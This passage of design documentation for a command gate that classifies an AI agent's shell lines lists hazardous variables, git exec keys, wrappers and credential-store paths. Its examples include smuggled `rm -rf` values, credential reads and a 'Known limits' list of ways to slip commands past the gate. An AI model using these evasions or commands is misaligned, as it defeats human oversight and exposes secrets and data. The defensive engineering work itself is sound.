  `GIT_EXTERNAL_DIFF`, `GIT_ASKPASS`, `GIT_PROXY_COMMAND`, `SSH_ASKPASS`, `RSYNC_RSH`,
  `RSYNC_CONNECT_PROG`, `PAGER`, `MANPAGER`, `EDITOR`, `VISUAL`, `BROWSER`, `GH_PAGER`,
  `GH_EDITOR`, `GH_BROWSER`, `PSQL_PAGER`, `PSQL_EDITOR`, `SUDO_ASKPASS`, `SUDO_EDITOR`,
  `PROMPT_COMMAND`, `LESSOPEN` or `LESSCLOSE` before the program (also through `env`, `sudo` or
  `timeout`). An `export NAME=value` or a bare `NAME=value` counts when the value is a known
  hazard. `PS4` counts the same way, read as the double-quoted text bash expands before every
  traced command (`set -x`, interactive or not): `export PS4='$(rm -rf /srv/data) '; set -x; ls`
  is `delete`, `export PS4='+ '` stays `allow`.
- Options are read as the program's `getopt` reads them: an unambiguous abbreviation of the long
  name, one letter or more (`--to-com=`, `psql --o`), and for `tar --checkpoint-action` any
  abbreviation longer than `--checkpoint`, which is an option of its own (`--checkpoint-a=exec=`,
  #232), or the value attached to the short letter or in the next word. In a cluster the first
  letter that takes a value ends the word (`-xIcmd`, `-oProxyCommand=cmd`, `-avze ssh`), and the
  gate knows which letters and long options take a value for `ssh`, `scp`, `sftp`, `tar` (also its
  old style, `tar xIf cmd a.tar`), `rsync`, `man`, `rg`, `psql` and the `git` subcommands, so a
  value is not read as options (`ssh -oServerAliveInterval=60` is not `-I`). A letter it does not
  know only makes it read more words. Options end at `--`; `ssh` reads them before and after its
  destination and stops at the remote command, so `ssh host curl -I URL` is the `curl` line; when
  a word before that may expand to no word or several (`$A`, `"$@"`, a glob), the destination
  cannot be counted and every word is read (`ssh {,} host -o ...` too: bash drops the empty words
  of `{,}`). An `ssh -o` setting is split as ssh's config reader splits it: leading whitespace, a
  quoted keyword, any case, and `Keyword value`, `Keyword=value` or `Keyword = value`. The value
  `none` (any case, as the bare word) turns a command or library setting off, as ssh_config
  documents, so `-o ProxyCommand=none` runs nothing and stays `allow` (#232). A keyword the gate
  cannot read (`-o "$OPT"`, `-o $OPT`, a glob, or an unclosed quote that the expansion may close,
  `-o '"'"$OPT"`) is `opaque_exec` and asks, like any other value in a variable (#230). `less`
  reads `+cmd` as keystrokes: `!` runs a shell command after any of them (`+G!cmd`, `+:n!cmd`),
  while a search (`+/pattern`) takes the rest as its pattern unless a newline or another control
  key ends it.
- A known program in an option's value (`tar -I zstd`, `rsync -e ssh`, `PAGER=cat`) stays
  `allow`; a program the gate does not know asks, as it would on its own. The compressors `tar
  -I` usually names are known programs, none of them with an exec option: `gzip`, `bzip2`, `xz`,
  `zstd` and `pigz`, `unpigz`, `pbzip2`, `lbzip2`, `lz4`, `lzop`, `lzip`, `lzma`, `unlzma`,
  `zstdmt`, `brotli`. A value the gate cannot read is `opaque_exec`: a variable, a script file
  (`tar --info-script`, `sqlite3 -init` or `--init`, `.read`, `.load`), `.once`/`.output FILE`,
  `.read '|cmd'` (what the command prints is run), `less +!` with no command or `+!!`, `psql ...
  PROGRAM`, `TAR_OPTIONS`, and a library `ssh` loads (`-I`, `-o PKCS11Provider`, `-o
  SecurityKeyProvider`). `sed` scripts with `e` or
  `s///e` and `awk` programs calling `system()` were already opaque. An argument that merely
  looks like an assignment (`grep EDITOR=vim`) and a data load (`sqlite3 '.import f.csv t'`) are
  not commands. A variable that loads code or decides where programs, modules and config files
  are found is `opaque_exec`, named in the summary: `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`,
  `GCONV_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH`,
  `DYLD_FALLBACK_LIBRARY_PATH`, `DYLD_FALLBACK_FRAMEWORK_PATH`, `OPENSSL_CONF`,
  `OPENSSL_ENGINES`, `OPENSSL_MODULES`, `PATH`, `HOME` (it picks `~/.gitconfig`, `~/.ssh/config`
  and `~/.exo`), `XDG_CONFIG_HOME`, `BASH_ENV`, `ENV`, `ZDOTDIR`, `GIT_EXEC_PATH`,
  `GIT_TEMPLATE_DIR`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `PYTHONSTARTUP`, `PYTHONPATH`,
  `PYTHONHOME`, `PYTHONUSERBASE`, `PERL5OPT`, `PERL5LIB`, `PERLLIB`, `RUBYOPT`, `RUBYLIB`,
  `NODE_OPTIONS`, `NODE_PATH`, `PSQLRC`, `GIT_ALLOW_PROTOCOL`, the option variables `MANOPT`,
  `ZIPOPT` and `RIPGREP_CONFIG_PATH` (their command-line forms `man -P`, `zip -TT` and `rg --pre`
  already count), `LESS` when it holds a `+` command (`LESS=-R` stays `allow`), and a non-empty
  `CDPATH`, which moves a relative `cd` into the Exo store unseen (`CDPATH= cd src` stays
  `allow`). A value that changes nothing the gate relies on keeps the line's class: an empty
  loader variable (`LD_PRELOAD= ls`; the loader skips it), `GIT_CONFIG_GLOBAL` or
  `GIT_CONFIG_SYSTEM` set to `/dev/null`, a `PATH` made only of the current one (`$PATH`) and
  folders the gate already trusts a program from by path, a system bin folder, a virtualenv's
  `bin` or `node_modules/.bin` (`PATH=$PATH:./node_modules/.bin eslint .`,
  `export PATH="$PWD/.venv/bin:$PATH"`; `PATH+=:/usr/local/bin` is `$PATH:/usr/local/bin`; `$PATH`
  counts as the current PATH only where bash expands it, so `export PATH='$PATH:/usr/bin'` and
  `env 'PATH=$PATH' ls`, where it is a folder named `$PATH`, ask; so does a folder written with
  `..`, such as `/tmp/s/../../usr/bin`, which the system resolves through links), and
  `PYTHONPATH` before `pytest` or `python -m pytest`, which already run the project's code.
  These still ask, on purpose: an empty `PATH` element, which is the current folder (`PATH= ls`,
  `PATH=$PATH: ls`), any other folder in `PATH`, appended or not, since it supplies every program
  the folders before it lack (`export PATH="$HOME/.local/bin:$PATH"`), `PYTHONPATH` before any
  other program (`PYTHONPATH=/tmp/p python3 -m json.tool x` loads a `json` module from there) or
  exported, and `GIT_CONFIG_GLOBAL` set to a file. `unset PATH` and `unset -v PATH` ask as
  `PATH=` does, since with no `PATH` bash looks a command up in the current folder (#329).
  `unset -f PATH` stays `allow`: `-f` names a function, and with `-v` it is an error. The gate
  takes `-f` only from an option word it can read, before any word it cannot. A `+x` word, `--`
  or a name ends unset's options, so a later `-f` is a name (`unset +f -f PATH` asks). An
  `unset` with a word the gate cannot read asks too, as a name or as an option: a name made by a
  variable or a substitution (`unset "$v"`, `unset $(echo PATH)`), an option word with one
  (`unset -${f}v PATH`), a `$` outside double quotes, which bash may split into more names
  (`unset a[$i]`), a glob (`unset PAT?`, `unset [P]ATH`, and an unquoted subscript such as
  `unset arr[1]`), or an unquoted brace (`unset {PATH,}`). bash drops a `\<newline>` before it
  reads a word, so `unset \<newline>[P]ATH` asks too. A word wholly in double quotes is
  read as before (`unset "arr[$k]"`), and so is `unset 'arr[1]'`. `unset -n PATH` asks too, to
  be safe. bash leaves a plain `PATH` set under `-n`, but it unsets a `PATH` that an earlier
  command made a nameref. The
  line sets one before the program, through a prefix, exported or bare (`export -p` and
  `readonly -p` assign too, while `declare -p` only prints), as a parameter-expansion assignment
  (`${PATH:=.}` or `${PATH=.}`, also in double quotes or a here-string), as the name `read` (also
  `-a`) or `printf -v` fills, as a `for` variable, through a nameref (`declare -n r=PATH`), or as
  an integer through arithmetic, an array subscript, or a `{PATH}>` redirection (`$((PATH=10))`,
  `$((PATH++))`, `$((--PATH))`, `$((PATH<<=1))`, `a[PATH=10]=1`, `${a[PATH=10]}`). A subscript
  counts where bash reads the word as a variable name: an assignment, `${a[...]}`, and the name an
  exporter, `unset`, `read`, `printf -v`, a nameref or `test -v` takes. `mapfile` and `getopts`
  already ask. Parameter expansion that
  only reads or substitutes (`${PATH}`, `${PATH:-/usr/bin}`, `${PATH#/x}`) assigns nothing and
  stays `allow`. So does text bash does not expand: single-quoted text, a quoted here-doc, and
  a bracket outside a subscript, which is a glob (`git commit -m 'read ${PATH:=.}'`,
  `pytest -q 'test_x[HOME=/tmp]'`, `echo [HOME=x]`). An expansion runs to the `}` bash closes
  it with, past a nested `${b}` but not into quoted or escaped text, and the single-quoted text
  inside it counts only where bash expands it: in double quotes after `:-`, `:=` and the like,
  not after a pattern (`echo ${a:-'${PATH:=.}'}` and `echo "${f%'${PATH:=.}'}"` stay `allow`,
  `echo "${a:-'${PATH:=.}'}"` asks). A partly quoted value loses its quotes as
  bash removes them, so `${GIT_SSH_COMMAND:=rm' -rf x'}` reads as `rm -rf x`. The scan is
  linear in the line: each brace, bracket and paren pair is found in one pass (a subscript ends
  at the `]` that matches its `[`), and a nested `${..}` longer than 64 characters stands in its
  parent's value as `${_}`, so classify, which runs in the gate hook, cannot be stalled by a
  long run of unclosed or nested expansions. A name the gate cannot read (`export $X=...`,
  `read -r "$v"`, `declare -n r=$X`, a nameref with no target, or a glob the shell expands
  first such as `export PAT?=.` or `read HOM[E]`) is opaque too. So is an exporter option word
  the gate cannot read (`declare -${f}x $V=`). The options end at that word, so a `-f` or `-p`
  after it does not count. `export` and `readonly` read `+x` as a name, and the words after it
  as names too. So `export +x -f $V=` asks, and `readonly +x -n r=PATH` makes no nameref
  (#329). An exporter name in a brace (`export {PATH,X}=`) is not read yet (#438), and neither
  is a leading `[` in a `read` or exporter name (`read [P]ATH`).
  Git config set on the line (`git -c`, `git --config-env`, attached or not, `git clone
  --config` or `-c`, `git config`, `GIT_CONFIG_KEY_<n>` with `GIT_CONFIG_VALUE_<n>`,
  `GIT_CONFIG_PARAMETERS`) takes one exec-key check, and the value of an exec key is classified
  as a command too, so a `deny: [delete]` fires on `core.sshCommand='rm -rf ...'`. An exec key
  is an alias, the pager, the editor, `core.sshCommand`, a hook path, a filter or diff driver, a
  credential helper, `interactive.diffFilter`, `remote.<name>.uploadpack` or `receivepack`, the
  `.path` of a difftool, mergetool, man or browser tool, any key whose last part ends in
  `command` or `cmd` (`gpg.ssh.defaultKeyCommand`, `core.alternateRefsCommand`,
  `sendemail.sendmailCmd`), or any key with a `!` value. A key that loads another config file or
  a template (`include.path`, `includeIf.<condition>.path`, `init.templateDir`) is opaque: the
  included file can set any exec key, and the hooks in a template run. So is a switch that lets
  git reach a remote through `ext::`, whose URL is a command git runs: `protocol.allow`,
  `protocol.ext.allow`, a `url.ext::<...>.insteadOf` or `pushInsteadOf` rewrite, a remote `url`
  or `pushurl` that starts with `ext::`, and the `GIT_ALLOW_PROTOCOL` variable. Such a key
  never hides git's subcommand (#335): its part stands beside the subcommand's own category, so
  `git -c include.path=/dev/null push --force origin main` is `force_push`, asks, and is denied
  under `deny: [force_push]` or `categories: {force_push: deny}`. On a read (`git -c
  core.pager=less log`) the key's part decides, and the line asks. Only an unknown subcommand,
  which the config may define as an alias, is opaque on its own, and its card names the config.
  `git config include.path FILE` asks and keeps its `local_write` part, so a deny on
  `local_write` still fires.
  `git config` is read as git reads it: the subcommand (`set`, `get`, `unset`...) and the values
  of `-f`, `-t`, `--file`, `--blob`, `--type`, `--default`, `--comment`, `--value` and `--url`
  are not the key, also when a long option is shortened to a prefix git accepts (`--fil`,
  `--ty`, `--rename-sec`), so `git config set include.path x` and `git config -f .git/config core.fsmonitor x`
  ask as `git config include.path x` does, and `git config rename-section x include` asks too:
  it can turn `x.path` into `include.path`. A key the gate cannot read, a `--config-env` value
  (it comes from a variable) for an exec key, and `git clone --template` or `git init
  --template` are opaque. `env` and `sudo` read `NAME=VALUE` from their
  own argv, so a quoted one after them (`env 'LD_PRELOAD=x' ls`) is an assignment. `IFS` is left
  out: it does not change how literal words split, and `while IFS= read -r line` is everyday.
- Environment dumps count as `credentials` wherever a prefix or runner is stripped (#155):
  `printenv`, a bare `env`, `set`, `export -p`, `declare -x` and the like behind `sudo`, `nice`,
  `timeout`, `env`, `ionice`, `stdbuf`, `coproc`, `uv run`, `poetry run`, `pdm run`, `pipenv run`
  or `hatch run`, inside an `if`, `for` or `while` body, or behind a wrapper below (`setsid env`,
  `taskset 1 printenv GITHUB_TOKEN`), classify as `credentials` just as the bare command does.
  Every assignment bash takes before a command counts as one, `NAME+=value` and `NAME[i]=value`
  included, so `FOO+=1 printenv GITHUB_TOKEN` and `env FOO[0]=1` are dumps too (#230). A runner
  followed by ordinary work (`uv run pytest -q`) is unchanged. `uvx`, `pipx run` and `npx` stay
  `opaque_exec`.
- Wrappers that run a command are read the same way (#160). The prefix wrappers `setsid`,
  `flock`, `chroot`, `unshare`, `nsenter`, `taskset`, `chrt`, `numactl`, `chronic`,
  `unbuffer`, `catchsegv`, `firejail`, `dbus-run-session`, `xvfb-run`, `systemd-run` and
  `watch -x` run the argv after their options and fixed operands (the lock file of `flock`,
  the new root of `chroot`, the mask of `taskset`, the priority of `chrt`). A wrapper's options
  are read as `getopt` reads them: a value attached, inside a cluster (`-nw5`) or in the next
  word, `--opt=value`, `--`, and, for these wrappers only, a long option shortened to four
  letters or more (`--time` for `--timeout`; a shorter one, `flock --tim 5`, is not read and the
  line asks, unlike the one-letter rule for the trusted programs above). The
  command-string forms are read like `bash -c`: `flock FILE -c CMD`,
  `script -c CMD` (`--command`), `watch CMD...` (the words joined, run through `sh -c`), the
  shell-command of `tmux new-session`, `new-window`, `split-window` (also by its default aliases
  `splitp` and `split-pane`), `respawn-pane`, `respawn-window` and `run-shell` in each command of
  a tmux command list and of `tmux -c` (the list is split as tmux splits it: an argument ending in
  `;`, such as `';'` or `'sleep 3;'`, ends a command and loses the `;`, one ending in `\;` does
  not), the argv of `screen [-dm] [-S name]` and `screen -X screen`, and the template of
  `parallel CMD ::: args` with each argument appended or put where `{}` stands (on the line itself, up to 16 distinct arguments and four times that
  command's own length, each text sized before it is built; a nested `parallel` template is read
  alone, so the work stays linear in the line).
  The wrapper itself stays an `opaque_exec` part with `indirection`, so
  the line asks as before. A `deny:` entry that matches the inner command denies the line
  (D-075), also when its category ties with `opaque_exec` or ranks below it (`schedule`;
  `web_read`, `local_write`: `setsid systemctl enable foo`, `setsid curl URL`). A `categories:`
  line or a rule that denies such a category denies the line too (#191). `chroot`, `nsenter`,
  `unshare` and `systemd-run` run the command with other privileges, namespaces or as a
  system unit: like `sudo`, the line carries a signal named after the wrapper and a reversible
  part counts as costly. What the gate cannot read stays `opaque_exec`: a program from a
  variable, `tmux send-keys`, a `screen -X` command other than `screen`, `parallel` with no
  template (commands from its input or `:::`), a wrapper with no command (an interactive shell,
  `flock 9`), and options the tables do not know. As with `bash -c`, a wrapped command that
  outranks `opaque_exec` (`setsid git push`) takes the line's category, so a deny on
  `opaque_exec` itself no longer reaches it: under `deny: [opaque_exec]`, `categories:
  {opaque_exec: deny}` or a rule on `opaque_exec` with decision `deny` the line asks (the
  `indirection` floor below), where it was denied before. D-075 makes a `deny:` entry, and #191
  a category line or rule that denies, apply to every part, so the wrapper part denies the line.
- `coproc` inspects the inner command's original words, preserving quotes (and, in the simple
  form `coproc bash <<EOF`, the heredoc), while retaining `indirection`. As in bash, a name
  before a compound command (`coproc w { ...; }`, `coproc w while ...`, `coproc w if ...`) is
  skipped; before a simple command (`coproc w echo hi`) the first word is the program. bash takes
  the opener as a reserved word only right after `coproc` and the name, so a redirection, heredoc
  or here-string between them (`coproc rm >/dev/null { -rf x`, `coproc 2>/dev/null rm { ...`,
  `coproc rm <<<x while ...`) gives a simple command that runs the name. The gate then reads the
  name as the program too, and keeps the skipped reading beside it (#207). A redirection after the
  opener, in the body or after the closing `}`, changes nothing. Such a line now takes the name's
  category (`delete` for `rm`), but the coproc stays an `opaque_exec` part, so `deny: [opaque_exec]`
  (D-075) and `categories: {opaque_exec: deny}` or a rule that denies it (#191) still deny the line.
  `function NAME { ...; }` is read the same way. An environment dump inside (`coproc env`,
  `coproc w { printenv GITHUB_TOKEN; }`) is `credentials`. Before D-075, a coproc was denied
  only when its inner command outranked `opaque_exec` (`delete`, `vcs_push`, `credentials`); a
  category that tied with it or ranked below it (`schedule`; `web_read`, `local_write`) still
  asked. The inner commands are now parts, so a `deny` entry matching any of them denies
  (`coproc w { curl https://example.com; }` under `deny: [web_read]`).
  A heredoc after the closing `}` of a block (`coproc W { bash; } <<EOF`) is fed to the commands
  inside it, as for `{ ...; } <<EOF` on its own (see "Compound commands" below).
- Code (`python -c`, `execute_code`, a heredoc fed to an interpreter) is read for known calls
  and for string literals and lists of strings that parse as a command
  (`subprocess.run(['gh','pr','comment',...])` is a `github_post`). A literal is also read with
  its `\n` and `\t` escapes applied. It becomes a part when any simple command in it classifies
  as a non-benign category, whatever the order (`ls; git push` and `./build.sh; systemctl enable
  x` alike); a literal that is all `read`, `web_read`, `local_write` and the like is dropped, and
  code can reach a target with no literal at all.
- The principal can lower `opaque_exec` only by naming it below ask: `categories: {opaque_exec: act}`
  or a rule whose match has `category: opaque_exec` and whose decision is `act` or `report` (for
  example with a `command` regex for `make`). Naming it at `ask` or `deny` keeps the indirection
  floor: a command the gate reads inside a wrapper still asks at least, whatever its own category
  says (#178).
  That does not lower the ask of a command a declaration runs as it reads a value again
  (`reread`, above).

A change to the classifier or to `decide` is checked against main with `scripts/gate_diff.py` (#423, D-038
amendment of 2026-10-22). It runs both gates over the suites' lines, a line or call for each entry of the gate's
tables, generated forms of them and a set of policies, and lists every decision the change makes lower. A lowered
line is fixed or named in the change's decision amendment. A table the change holds in a form the script does not
read stops the run with exit 2, since its entries get no lines. The secret path, SQL, patch header and scrub patterns
get a string for each alternative. Any other regex alternative or helper pattern is seen only where a test or a seed
names it. The check also does not see the stores the environment moves, session folders beyond the ones it generates,
names and keys the gate reads outside its tables unless a test names them, files and links in HOME beyond its own,
or the hook steps after `decide` (developer guide §7, "Checking a gate change against main").

Known limits. Each one is true of main today; where a fix is open, its PR is named.

- **Inspection depth (#137).** Nesting is read four levels deep (`_DEPTH = 4` in `exo.gate`).
  The bound holds for a `bash -c`, `sh -c` or `eval` chain called from the bash tool:
  `gh pr comment 3 --body hi` inside up to four such wrappers is still `github_post`; inside
  five, the innermost text is not read and the line is `opaque_exec` with the `indirection`
  signal, so the default policy asks. The card names the outermost wrapper (`bash runs shell
  commands`, `eval runs text as a command`), not the cap or the hidden command, so it is the
  same card as `bash -c 'foo'`: a compound classification keeps the first of equally severe
  parts, and the `nested too deep to read` part that `xargs`, `find -exec`, `uv run` and `$( )`
  add at the cap reaches the card only when the outer part is benign (`uv run`, `echo $( )`).
  A command found inside a code string (`python -c`, `node -e`, `execute_code`, a heredoc fed
  to an interpreter) gets one more level wherever the code sits, because the code reader starts
  again at the last level: one `bash -c` inside `os.system(...)` is read; a second usually is
  not (it depends on how the literals are quoted) and the line asks, as `opaque_exec` or, through
  `execute_code`, as `code`. A chain that mixes wrappers and code strings can therefore be read
  deeper than four levels. Nested `$( )` is flattened by the lexer, so each one is read at
  depth one, up to 16 levels inside one another (#334, above). Past that the nest is an unread
  `opaque_exec` part and a command inside it is not read, while a command after it still is.
  Nested backticks are capped at the inspection depth: four levels are read, and at five the
  line is `opaque_exec`, `nested too deep to read`. An `ssh` or `mosh` chain with more hops than
  the cap asks as `opaque_exec` too, with the first host as its target, so a `target:` deny on
  that host still denies it (#153, fixed by
  #164). Past the cap the line asks unless the principal has set a policy for `opaque_exec` (a
  `command:` deny entry or a deny rule that matches the text still denies it).
- **Only a deny and the posting checks reach every part of a line.** `classify_shell` keeps the
  most severe part of a compound line, which sets the card. A deny reaches every part the gate
  reads, nested ones included: a `deny:` entry since D-075, a `categories:` line or rule that
  denies a part since #191, and a matrix cell that denies a part since #464. So
  `gh pr comment 3 --body hi && rm -rf build` is denied under
  `categories: {github_post: deny}` as under `deny: [github_post]`, and
  `coproc w { curl https://example.com; }` (and `function f { curl https://example.com; }`) is
  denied under `categories: {web_read: deny}`, though the block is `opaque_exec`. An allow, log or
  ask line or rule applies to the line's own category only: under `categories: {github_post: ask}`
  the line above asks for the delete, and approving it sends the post too. The posting checks read
  every post on the line (#396), so a forbidden word or a missing footer in any post asks. But
  third-party escalation, a matrix cell below deny and the floors read the dominant part only (#437):
  `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R other/repo --body $'fine\nF'`
  logs, while the second post alone asks. Since #394 a rule that
  would lower a compound line must also name its deciding command and every command that would get
  a stricter outcome alone, but a command allowed alone still rides on the outcome the rule gives,
  as before: `cd /tmp/other && git push --force origin main` and
  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under an allow rule
  for `'git push --force origin main'`, and the push then runs the hooks there. That rule allowed
  both lines before #394 too, and an anchored rule such as `'^git push --force origin main$'`
  matches neither, so both ask. `cd` changes the shell for the commands after it, but it is not on
  the setter list: the rule must still match the whole line, so that cannot loosen a decision. Use
  `reserved:` to ask on any part. Under either deny form the four-wrapper example above is denied
  and the five-wrapper example asks as `opaque_exec`. So approving an opaque card or a compound
  line can run an action the gate did not show. Read the whole command before approving it: an
  approval does not vouch for what the gate did not classify.
- **Deny becomes ask.** Where the gate cannot read the command it files the line as
  `opaque_exec`, which asks, so a `deny:` or `categories:` entry for the hidden action becomes
  an ask, and the card names the wrapper rather than the action. For example: nesting past the
  inspection depth (above); `eval $(...)` and `eval "$(...)"`; a command arriving on stdin,
  `echo '...' | xargs -I{} sh -c '{}'` (while
  `echo 3 | xargs -I{} sh -c 'gh pr comment {} --body hi'` is read and denied); the body of
  `time { ...; }` and of `time for x do ...; done`; and the wrapper forms #160 left unread, such as
  `su -c`, `runuser`, `bwrap`, tmux's `if-shell` and `send-keys`, and `parallel` with no template
  ("Known limit (#160)" below lists more of them). These are examples, not a complete list. After
  `time` the gate does not read `{` or `for` as a reserved word, so either is an unknown program
  there. The body of `time for x; do ...; done` is read.
- **Deny becomes allow.** Some unread execution does not even ask. An entry for the hidden
  action's category (`github_post`, `delete`...) does not reach it, in `categories:`, `deny:`
  or `reserved:`. An entry that matches the command text does (a `command:` regex, or a rule
  with a `command` match). Since #136 that regex also sees the literal-word view of the text
  the gate reads, so quoting does not evade it there: the command-valued options read since
  #164 and #288, the array subscripts read since #189, the `declare` values read since #194 and
  the git config values read since #231 are denied under `command:gh pr comment`
  (`tar --to-command='g"h" pr comment 3 --body hi'`,
  `git ls-remote --exec='g"h" pr comment 3 --body hi' origin`,
  `printf -v 'a[$(g"h" pr comment 3 --body hi)]' %s x`,
  `declare -a 'b=($(g"h" pr comment 3 --body hi))'`,
  `git clone -c core.sshCommand='g"h" pr comment 3 --body hi' git@host:x/y`; the last is also
  denied under `deny: [github_post]`). In the forms below the regex sees only
  the raw text, so quoting still evades it: `echo ${X:-$(g'h' pr comment 3 --body hi)}` is
  allowed under `command:gh pr comment`. The known forms:
  - `${...}` bodies are skipped by the lexer, so `echo ${X:-$(gh pr comment 3 --body hi)}` is
    `read` and allowed (#143; open PR #158).
- **Project code.** A trusted program that runs project code (pytest runs conftest.py, git runs
  hooks, `npm install` runs package scripts) or reads a startup file (`~/.sqliterc`, `~/.psqlrc`,
  `~/.ssh/config` with a `ProxyCommand`) can run code the agent wrote earlier with a local write.
  The same goes for options that read more options from a file (`curl --config`, `gcc -wrapper`,
  `-specs`, `ssh -F`, also from a heredoc or `<( )`: `ssh -F /dev/stdin h <<EOF`) and for
  `git grep -O`, whose pager takes the matching files as arguments. The gate does not claim to
  stop that; it stops the one-step forms. A sandbox is the real fix.

The working folder (#192). A line that enters a folder that can hold a secret store, and reads a
file there by a relative name, is `credentials`: `cd ~/.config/gh && cat hosts.yml`,
`cd ~/.kube/cache && cat ../config`, `time cd ~/.kube && cat config`,
`cd ~/.kube && tar czf - .` and `git -C ~/.kube diff --no-index config /dev/null` ask like
`cat ~/.kube/config`. The gate does not follow the folder from command to command; it reads the
whole line in one pass:

- Store folders and store file names come from the sample store paths the path matchers use, per
  call so that `HOME` and `EXO_HOME` apply. A dot folder along a sample below home is a store
  folder by its name (`.kube`, `.docker`, `.config`, `.ssh`, `.aws`, `.exo`, `.vercel`, also
  `Netlify`). A plain folder is one only below its parent in the sample (`.config/gh`,
  `.config/gcloud`, `.exo/keys`, `.hermes/p`, `/proc`, `EXO_HOME` and its `keys` when `EXO_HOME`
  is outside home), so a checkout called `exo` or `gh` is not. The store file names are the
  samples' file names (`config`, `config.json`, `hosts.yml`, `environ`, `token`, ...).
- The targets are those of `cd`, `pushd`, `git -C`, `env -C`/`--chdir`, `sudo -D`/`--chdir` and
  `tar -C`/`--directory`, wherever they stand (after `&&`, `||`, `;`, `|` or `&`, behind `time`,
  `command`, `builtin` or `!`, in a loop, `( )`, `{ }`, `$( )`, `<( )` or the text a shell
  runs), however the command is spelt (`c\d`, `"cd"`, `$'\x63d'`) and with the option attached,
  in a cluster, old-style or cut to a unique prefix (`env -C~/.kube`, `sudo -iD ~/.kube`,
  `tar czfC - ~/.kube`, `env --c=~/.kube`, `tar --dir ~/.kube`). A brace set is the words it
  spells (`~/.{ssh,x}`, a range `{1..3}`, `{007..010}` or `{a..c}`, padded as bash pads), up to
  16 in a word of up to 4096 characters, and one glob past that or for a stepped range
  (`{1..9..2}`).
- A line enters a store folder when a target has one among its parts (`~user/` and folders
  outside home count by their parts: `/proc/self`, `/srv/app/.kube`), or goes by a relative name
  into a plain one below another target: `cd ~/.config && cd ./gcloud`, `cd / && cd proc/self`,
  `cd ~/.config/nvim && cd ../gcloud`, `cd ~/.config/nvim/lua && cd .. && cd .. && cd gcloud`.
  The other target names a dot parent by its name (any `.config`) and a plain one by its path
  (`/`, `EXO_HOME`); a folder entered this way is a parent in turn. `..` is resolved as bash's
  `cd` does and stops at `/`. `~+`, `~0`, `$PWD`, `${PWD}`, `${PWD:-x}` and `$(pwd)` are the
  current folder, and `${PWD%/*}` is its parent.
- On such a line a relative name counts when its file name is a store file name, when it goes
  into a store folder (`gh/hosts.yml` after `cd ~/.config`, `../.docker/config.json`,
  `lua/../../gcloud/x` after `cd ~/.config/nvim`), and when it is a glob or brace set that could
  match one. The folder itself (`.`, `./`, `$PWD`) counts when a target is a store folder
  (`cd ~/.kube && tar czf - .`), and any relative name counts when a target is itself a store
  (`~/.ssh`, `~/.s?h`). A name that goes into a plain store folder from its parent counts on any
  line when it names a store (`cd /srv && tar cf - exo-home/keys` with
  `EXO_HOME=/srv/exo-home`).
- Globs are read as bash reads them: `[^x]` is `[!x]`, a `]` first in a set is a member, a class
  is spelt out (`e[[:alpha:]]viron`), a `[` that opens no set is a literal, and only a glob that
  spells a leading dot matches one (`*` is not `.ssh`). A glob with an unknown class or many `[`
  could match anything. A glob part with no character of its own (`cd */`, `cd node_modules/*/`)
  is not a store folder by its name. A quoted glob counts too, for the tools that match it
  themselves (`find -name 'conf*'`), so a quoted regex, `tr` set or jq slice names a store only
  when its pattern could match a store name.
- Names are read from the words and their pieces (`--kubeconfig=config`, `-d@config`,
  `f:=@config`), redirection targets and the bodies of `$( )`, `<( )` and the text a shell runs
  (`bash -c`, a heredoc fed to `bash`). They are not read from the program, the words before it
  (`sudo -u root`) except assignments (`KUBECONFIG=config kubectl` counts), the targets' own words
  (`mkdir -p .kube && cd .kube && ls` keeps its class), a `git` subcommand, a jq filter (`jq .`;
  not one read from a file with `-f`), other heredoc text or a word with a space in it (a commit
  message, an `echo`, `awk '{print $1, $2}'`) unless it holds an unquoted brace set.

In `$EXO_HOME` (#269). The run folder is not a store folder by its name, since job output in `run/jobs`
stays readable, so the checks above do not reach it through `..`. On a line that reaches a folder in
`$EXO_HOME` or in any `.exo`, that folder and each relative name read from it are checked as the paths
they are, resolved as the kernel resolves them (`..` included, through links), with the checks an
absolute path gets: `cd ~/.exo/run/jobs && cat ../exod*`, `grep -r . ..`, `ls ..`,
`cd ~/.exo/run/jobs && cd .. && ls`, `tar -C ~/.exo -czf - run` and `cd ~/.exo && ls run` ask, and
`cd ~/.exo/run/jobs && cat 1.log` stays `read`. The folders are the targets, each relative target
joined to each of them once, and every folder up to as many levels above them as the line's `cd ..`
climb; an absolute target is also resolved, so a link into `run/jobs` counts. From a folder outside
the store, a name that spells the store's folder name is joined too (`cd /srv && tar czf -
exo-home/run` with `EXO_HOME=/srv/exo-home`). The run folder's credential file names are store file
names as well (`exod.principal.key`, `exod.token`, the sampled `agent-<seat>.principal.key`), so
`cat ../exod*` asks on any line that enters a store folder. A `cd ..` counts once, as levels up, so `cd
~/.exo/run/jobs/7 && cd .. && ls` lists `run/jobs` and stays `read`. Each join of a folder with a target
or name, and each level up, is charged the path parts it builds, as it is made, to one budget of 65,536
parts for the whole tool call, which every `$( )` shares (each is classified again, nested ones too), so
the work stays linear in the line however deep the names are. Past the budget, or on a line that reaches
more than 64 such folders, the line asks (fails closed, no grant). A line that names no store folder
makes no join. A folder spelt with a wildcard is left to the store-folder check above.

A line that enters no store folder, and names none, is classified as before. The work is linear
in the line: set lookups per word, at most two small `fnmatch` matches per glob, at most 64
store tests per store folder (one per glob candidate), and a parent path kept only as deep as
the deepest sample store folder. The trade-off, which fails closed: neither the order nor the
success of the commands is followed, so on a line that enters a store folder a word named like a
store file asks even when it is elsewhere or is not a file
(`cd ~/.kube && cd ~/project && cat config`, `cat config; cd ~/.kube`,
`cd ~/.config/fish && cat config`, `cd ~/.config/nvim && ls *`,
`cd ~/.config/nvim && npm config get prefix`), and `.` asks in a store folder even for a listing
(`cd ~/.config && find . -name '*.toml'`). A line that is already `store_write` stays
`store_write` (the principal's alone). Known limits: a target in a variable or made by a command
(`X=~/.kube; cd $X`, `cd $(...)`); a name made by a command or with a space in it (`cat $(ls)`,
`"$(pwd -P)/config"`); a dot store folder named last in an operand
(`cd ~/.config && tar czf x ../.kube`, as for `tar czf x ~/.kube`); a relative target taken from
another relative one (`cd ~/.config && cd nvim && cd ../gcloud`); a glob in the parent of a
plain store folder (`cd /sr?/exo-home && cd keys`); a relative path that reaches a plain store
folder from more than one level above its parent (`cd / && cd srv/exo-home/keys`); other
